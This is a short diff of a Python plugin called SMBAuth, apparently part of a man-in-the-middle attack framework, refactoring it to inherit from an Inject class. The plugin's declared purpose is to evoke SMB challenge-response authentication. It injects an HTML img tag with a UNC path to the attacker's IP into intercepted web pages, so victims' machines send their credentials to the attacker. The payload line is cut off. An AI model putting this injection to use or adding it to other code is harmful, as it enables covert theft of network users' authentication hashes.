@@ -21,9 +21,8 @@
 from core.utils import SystemConfig
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
-from core.sergioproxy.ProxyPlugins import ProxyPlugins
 
-class SMBAuth(Plugin):
+class SMBAuth(Inject, Plugin):
     name     = "SMBAuth"
     optname  = "smbauth"
     desc     = "Evoke SMB challenge-response auth attempts"
@@ -33,10 +32,8 @@ class SMBAuth(Plugin):
     def initialize(self, options):
         self.target_ip = SystemConfig.getIP(options.interface)
 
-        inject = Inject()
-        inject.initialize(options)
-        inject.html_payload = self._get_data()
-        ProxyPlugins.getInstance().addPlugin(inject)
+        Inject.initialize(options)
+        self.html_payload = self._get_data()
 
     def _get_data(self):
         return '<img src=\"\\\\%s\\image.jpg\">'\
